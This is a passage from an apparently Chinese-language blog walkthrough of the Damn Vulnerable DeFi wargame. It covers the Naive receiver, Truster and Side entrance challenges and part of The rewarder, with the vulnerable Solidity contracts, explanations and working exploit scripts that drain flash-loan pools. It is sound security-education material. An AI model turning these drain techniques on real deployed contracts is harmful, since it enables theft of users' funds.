class="line"></span><br><span class="line">    <span class="comment">// Allow deposits of ETH</span></span><br><span class="line">    receive () external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>闪电贷中的借贷函数，也就是flashLoan有一点很吸引我的注意，就是他的借贷者并不是msg.sender，而是传入的参数borrower,这就很有意思了，这意味着我可以不停帮你借，如果你没有任何收益的话，你就得不停的偿还利息。知道这一点后我们可以看看用户合约。<br>用户合约中的receiveEther函数确实没有产生任何收益，所以我可以通过这种方式掏空用户的资产。</p>
+<h2 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h2><p>攻击合约：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">it</span>(<span class="string">&#x27;Exploit&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">/** CODE YOUR EXPLOIT HERE */</span>   </span><br><span class="line">        <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">pool</span>.<span class="title function_">flashLoan</span>(<span class="variable language_">this</span>.<span class="property">receiver</span>.<span class="property">address</span>,<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>
+<p>也就是遍历十次，为用户合约借十次钱，就能把用户余额掏空。<br><img src="https://img-blog.csdnimg.cn/b772dbde06dd4635bd9d42e87c37f564.png" alt="在这里插入图片描述"><br>运行函数完成攻击。</p>
+<h1 id="Truster"><a href="#Truster" class="headerlink" title="Truster"></a>Truster</h1><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>题目要求</p>
+<blockquote>
+<p>More and more lending pools are offering flash loans. In this case, a<br>new pool has launched that is offering flash loans of DVT tokens for<br>free.</p>
+<p>Currently the pool has 1 million DVT tokens in balance. And you have<br>nothing.</p>
+<p>But don’t worry, you might be able to take them all from the pool. In<br>a single transaction.</p>
+</blockquote>
+<p>意思就是有一个新的提供”DVT”借款的闪电贷合约启动了，他有一百万的余额，而我们一无所有，需要我们将闪电贷合约的一百万余额全部拿走。<br>闪电贷合约：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/utils/Address.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">TrusterLenderPool</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">TrusterLenderPool</span> is <span class="title class_">ReentrancyGuard</span> &#123;</span><br><span class="line"></span><br><span class="line">    using <span class="title class_">Address</span> <span class="keyword">for</span> address;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">IERC20</span> public immutable damnValuableToken;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span> (address tokenAddress) &#123;</span><br><span class="line">        damnValuableToken = <span class="title class_">IERC20</span>(tokenAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">flashLoan</span>(<span class="params"></span></span><br><span class="line"><span class="params">        uint256 borrowAmount,</span></span><br><span class="line"><span class="params">        address borrower,</span></span><br><span class="line"><span class="params">        address target,</span></span><br><span class="line"><span class="params">        bytes calldata data</span></span><br><span class="line"><span class="params">    </span>)</span><br><span class="line">        external</span><br><span class="line">        nonReentrant</span><br><span class="line">    &#123;</span><br><span class="line">        uint256 balanceBefore = damnValuableToken.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">        <span class="built_in">require</span>(balanceBefore &gt;= borrowAmount, <span class="string">&quot;Not enough tokens in pool&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        damnValuableToken.<span class="title function_">transfer</span>(borrower, borrowAmount);</span><br><span class="line">        target.<span class="title function_">functionCall</span>(data);</span><br><span class="line">    </span><br><span class="line">        uint256 balanceAfter = damnValuableToken.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">        <span class="built_in">require</span>(balanceAfter &gt;= balanceBefore, <span class="string">&quot;Flash loan hasn&#x27;t been paid back&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>题目只给了这一个合约，那么毫无疑问我们肯定需要从这个合约入手，我们可以看到他的两个require分别对余额是否充足，以及是否进行归还都进行了限制，那么我们的攻击入口就只剩下了 <code>target.functionCall(data)</code>这一句，这一个call调用让我们可以干很多事情，我们从这一点开始攻击。</p>
+<h2 id="攻击-2"><a href="#攻击-2" class="headerlink" title="攻击"></a>攻击</h2><p>攻击合约：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">it</span>(<span class="string">&#x27;Exploit&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">/** CODE YOUR EXPLOIT HERE  */</span></span><br><span class="line">        <span class="keyword">const</span> data = web3.<span class="property">eth</span>.<span class="property">abi</span>.<span class="title function_">encodeFunctionCall</span>(</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">name</span>: <span class="string">&#x27;approve&#x27;</span>,</span><br><span class="line">                <span class="attr">type</span>: <span class="string">&#x27;function&#x27;</span>,</span><br><span class="line">                <span class="attr">inputs</span>: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">type</span>: <span class="string">&#x27;address&#x27;</span>,</span><br><span class="line">                        <span class="attr">name</span>: <span class="string">&#x27;addr&#x27;</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">type</span>: <span class="string">&#x27;uint256&#x27;</span>,</span><br><span class="line">                        <span class="attr">name</span>: <span class="string">&#x27;amount&#x27;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;,[attacker.<span class="property">address</span>, <span class="variable constant_">TOKENS_IN_POOL</span>]</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">pool</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">flashLoan</span>(<span class="number">0</span>, attacker.<span class="property">address</span>, <span class="variable language_">this</span>.<span class="property">token</span>.<span class="property">address</span>, data);</span><br><span class="line">        <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">token</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">transferFrom</span>(<span class="variable language_">this</span>.<span class="property">pool</span>.<span class="property">address</span>, attacker.<span class="property">address</span>, <span class="variable constant_">TOKENS_IN_POOL</span>);</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>
+<p>我解释一下这些代码的含义，<code>const data = web3.eth.abi.encodeFunctionCall</code>，这个函数是为了生成我们的data，使在进行target.FunctionCall时能调用到我们想要的函数。<br>攻击思路也很简单，因为是从闪电贷合约中进行调用的，所以在call中调用token的approve函数，就会使闪电贷合约给attacker地址授权转账，再调用transferFrom即可。<br><img src="https://img-blog.csdnimg.cn/910ae342cb5b41858c6c9d3a41932f7d.png" alt="在这里插入图片描述"><br>两个connect的目的是为了让我们以attacker的账户进行攻击，这样每次调用前就会指定进行交互的外部账户。<br><img src="https://img-blog.csdnimg.cn/5b8c3f5b2e584a338c33e073168e6dbb.png" alt="在这里插入图片描述"><br>执行脚本，完成攻击。</p>
+<h1 id="Side-entrance"><a href="#Side-entrance" class="headerlink" title="Side entrance"></a>Side entrance</h1><h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><p>题目要求</p>
+<blockquote>
+<p>A surprisingly simple lending pool allows anyone to deposit ETH, and<br>withdraw it at any point in time.</p>
+<p>This very simple lending pool has 1000 ETH in balance already, and is<br>offering free flash loans using the deposited ETH to promote their<br>system.</p>
+<p>You must take all ETH from the lending pool.</p>
+</blockquote>
+<p>大意就是说有一个借贷池正在提供闪电贷，有一千ETH余额，需要我们将它们全部拿到手。<br>借贷池：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/utils/Address.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">IFlashLoanEtherReceiver</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">execute</span>(<span class="params"></span>) external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">SideEntranceLenderPool</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">SideEntranceLenderPool</span> &#123;</span><br><span class="line">    using <span class="title class_">Address</span> <span class="keyword">for</span> address payable;</span><br><span class="line"></span><br><span class="line">    mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint256) private balances;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">deposit</span>(<span class="params"></span>) external payable &#123;</span><br><span class="line">        balances[msg.<span class="property">sender</span>] += msg.<span class="property">value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params"></span>) external &#123;</span><br><span class="line">        uint256 amountToWithdraw = balances[msg.<span class="property">sender</span>];</span><br><span class="line">        balances[msg.<span class="property">sender</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="title function_">payable</span>(msg.<span class="property">sender</span>).<span class="title function_">sendValue</span>(amountToWithdraw);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">flashLoan</span>(<span class="params">uint256 amount</span>) external &#123;</span><br><span class="line">        uint256 balanceBefore = <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span>;</span><br><span class="line">        <span class="built_in">require</span>(balanceBefore &gt;= amount, <span class="string">&quot;Not enough ETH in balance&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="title class_">IFlashLoanEtherReceiver</span>(msg.<span class="property">sender</span>).<span class="property">execute</span>&#123;<span class="attr">value</span>: amount&#125;();</span><br><span class="line"></span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span> &gt;= balanceBefore, <span class="string">&quot;Flash loan hasn&#x27;t been paid back&quot;</span>);        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+<p>题目只给了这个合约，这个合约包含三个函数，存，取和借，flashloan函数中限制了借的钱以及是否归还，并且调用者必须满足IFlashLoanEtherReceiver接口，因此调用者必须是一个合约，且满足此接口，那么execute函数则是我们可以自己定义的。<br>那么如果我们在execute函数中将借来的ETH再存进去，是否就可以绕开<code> require(address(this).balance &gt;= balanceBefore, &quot;Flash loan hasn&#39;t been paid back&quot;);</code>呢，且我们的balance增加就可以直接取出来。</p>
+<h2 id="攻击-3"><a href="#攻击-3" class="headerlink" title="攻击"></a>攻击</h2><p>攻击合约：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/utils/Address.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./SideEntranceLenderPool.sol&quot;</span>;</span><br><span class="line">contract sideEntranceLenderAttack&#123;</span><br><span class="line">    using <span class="title class_">Address</span> <span class="keyword">for</span> address payable;</span><br><span class="line">    <span class="title class_">SideEntranceLenderPool</span> public pool;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _addr</span>)public&#123;</span><br><span class="line">        pool = <span class="title class_">SideEntranceLenderPool</span>(_addr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">execute</span>(<span class="params"></span>)external payable&#123;</span><br><span class="line">        pool.<span class="property">deposit</span>&#123;<span class="attr">value</span>:msg.<span class="property">value</span>&#125;();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">attack</span>(<span class="params">uint256 amount</span>)public payable&#123;</span><br><span class="line">        pool.<span class="title function_">flashLoan</span>(amount);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params"></span>)public payable&#123;</span><br><span class="line">        pool.<span class="title function_">withdraw</span>();</span><br><span class="line">        <span class="title function_">payable</span>(msg.<span class="property">sender</span>).<span class="title function_">send</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">fallback</span>()external payable&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>js攻击合约：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">it</span>(<span class="string">&#x27;Exploit&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">/** CODE YOUR EXPLOIT HERE */</span></span><br><span class="line">        <span class="keyword">const</span> <span class="title class_">SideEntranceLenderAttackFactory</span> = <span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&quot;sideEntranceLenderAttack&quot;</span>,attacker)</span><br><span class="line">        <span class="keyword">const</span> attack = <span class="keyword">await</span> <span class="title class_">SideEntranceLenderAttackFactory</span>.<span class="title function_">deploy</span>(<span class="variable language_">this</span>.<span class="property">pool</span>.<span class="property">address</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> attack.<span class="title function_">connect</span>(attacker).<span class="title function_">attack</span>(<span class="variable constant_">ETHER_IN_POOL</span>)</span><br><span class="line">        <span class="keyword">await</span> attack.<span class="title function_">connect</span>(attacker).<span class="title function_">withdraw</span>()</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>
+<p>我们编写sideEntranceLenderAttack合约，并把他放在contract目录下，然后再js文件中部署该合约。随后进行攻击，第一步调用attack函数借钱，触发execute存钱后成功调用，在进行第二步取钱即可。<br><img src="https://img-blog.csdnimg.cn/46c5ebf1a2bd4994ad43f6b8696489ec.png" alt="在这里插入图片描述"><br>执行脚本，完成攻击。</p>
+<h1 id="The-rewarder"><a href="#The-rewarder" class="headerlink" title="The rewarder"></a>The rewarder</h1><h2 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h2><p>题目要求：</p>
+<blockquote>
+<p>There’s a pool offering rewards in tokens every 5 days for those who<br>deposit their DVT tokens into it.</p>
+<p>Alice, Bob, Charlie and David have already deposited some DVT tokens,<br>and have won their rewards!</p>
+<p>You don’t have any DVT tokens. But in the upcoming round, you must<br>claim most rewards for yourself.</p>
+<p>Oh, by the way, rumours say a new pool has just landed on mainnet.<br>Isn’t it offering DVT tokens in flash loans?</p>
+</blockquote>
+<p>大意是有一个矿池，每五天为在他们这存DVT代币的人一些奖励，而我们没有DVT代币，却也希望得到奖励。<br>题目给了四个合约<br>矿池：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./RewardToken.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;../DamnValuableToken.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./AccountingToken.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">TheRewarderPool</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">TheRewarderPool</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Minimum duration of each round of rewards in seconds</span></span><br><span class="line">    uint256 private constant <span class="variable constant_">REWARDS_ROUND_MIN_DURATION</span> = <span class="number">5</span> days;</span><br><span class="line"></span><br><span class="line">    uint256 public lastSnapshotIdForRewards;</span><br><span class="line">    uint256 public lastRecordedSnapshotTimestamp;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint256) public lastRewardTimestamps;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Token deposited into the pool by users</span></span><br><span class="line">    <span class="title class_">DamnValuableToken</span> public immutable liquidityToken;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Token used for internal accounting and snapshots</span></span><br><span class="line">    <span class="comment">// Pegged 1:1 with the liquidity token</span></span><br><span class="line">    <span class="title class_">AccountingToken</span> public accToken;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Token in which rewards are issued</span></span><br><span class="line">    <span class="title class_">RewardToken</span> public immutable rewardToken;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Track number of rounds</span></span><br><span class="line">    uint256 public roundNumber;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address tokenAddress</span>) &#123;</span><br><span class="line">        <span class="comment">// Assuming all three tokens have 18 decimals</span></span><br><span class="line">        liquidityToken = <span class="title class_">DamnValuableToken</span>(tokenAddress);</span><br><span class="line">        accToken = <span class="keyword">new</span> <span class="title class_">AccountingToken</span>();</span><br><span class="line">        rewardToken = <span class="keyword">new</span> <span class="title class_">RewardToken</span>();</span><br><span class="line"></span><br><span class="line">        <span class="title function_">_recordSnapshot</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@notice</span> sender must have approved `amountToDeposit` liquidity tokens in advance</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">deposit</span>(<span class="params">uint256 amountToDeposit</span>) external &#123;</span><br><span class="line">        <span class="built_in">require</span>(amountToDeposit &gt; <span class="number">0</span>, <span class="string">&quot;Must deposit tokens&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        accToken.<span class="title function_">mint</span>(msg.<span class="property">sender</span>, amountToDeposit);</span><br><span class="line">        <span class="title function_">distributeRewards</span>();</span><br><span class="line">  </span><br><span class="line">        <span class="built_in">require</span>(</span><br><span class="line">            liquidityToken.<span class="title function_">transferFrom</span>(msg.<span class="property">sender</span>, <span class="title function_">address</span>(<span class="variable language_">this</span>), amountToDeposit)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params">uint256 amountToWithdraw</span>) external &#123;</span><br><span class="line">        accToken.<span class="title function_">burn</span>(msg.<span class="property">sender</span>, amountToWithdraw);</span><br><span class="line">        <span class="built_in">require</span>(liquidityToken.<span class="title function_">transfer</span>(msg.<span class="property">sender</span>, amountToWithdraw));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">distributeRewards</span>(<span class="params"></span>) public returns (uint256) &#123;</span><br><span class="line">        uint256 rewards = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_">isNewRewardsRound</span>()) &#123;</span><br><span class="line">            <span class="title function_">_recordSnapshot</span>();</span><br><span class="line">        &#125;        </span><br><span class="line">        </span><br><span class="line">        uint256 totalDeposits = accToken.<span class="title function_">totalSupplyAt</span>(lastSnapshotIdForRewards);</span><br><span class="line">        uint256 amountDeposited = accToken.<span class="title function_">balanceOfAt</span>(msg.<span class="property">sender</span>, lastSnapshotIdForRewards);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (amountDeposited &gt; <span class="number">0</span> &amp;&amp; totalDeposits &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            rewards = (amountDeposited * <span class="number">100</span> * <span class="number">10</span> ** <span class="number">18</span>) / totalDeposits;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(rewards &gt; <span class="number">0</span> &amp;&amp; !<span class="title function_">_hasRetrievedReward</span>(msg.<span class="property">sender</span>)) &#123;</span><br><span class="line">                rewardToken.<span class="title function_">mint</span>(msg.<span class="property">sender</span>, rewards);</span><br><span class="line">                lastRewardTimestamps[msg.<span class="property">sender</span>] = block.<span class="property">timestamp</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> rewards;     </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_recordSnapshot</span>(<span class="params"></span>) private &#123;</span><br><span class="line">        lastSnapshotIdForRewards = accToken.<span class="title function_">snapshot</span>();</span><br><span class="line">        lastRecordedSnapshotTimestamp = block.<span class="property">timestamp</span>;</span><br><span class="line">        roundNumber++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_hasRetrievedReward</span>(<span class="params">address account</span>) private view returns (bool) &#123;</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            lastRewardTimestamps[account] &gt;= lastRecordedSnapshotTimestamp &amp;&amp;</span><br><span class="line">            lastRewardTimestamps[account] &lt;= lastRecordedSnapshotTimestamp + <span class="variable constant_">REWARDS_ROUND_MIN_DURATION</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isNewRewardsRound</span>(<span class="params"></span>) public view returns (bool) &#123;</span><br><span class="line">        <span class="keyword">return</span> block.<span class="property">timestamp</span> &gt;= lastRecordedSnapshotTimestamp + <span class="variable constant_">REWARDS_ROUND_MIN_DURATION</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>也就是我们的主合约，我们可以看到，一旦我们往合约中存钱，也就是调用deposit，就会触发奖励哈数，如果距离上次奖励的天数过了五天，我们就可以得到奖励代币。<br>闪电贷：</p>
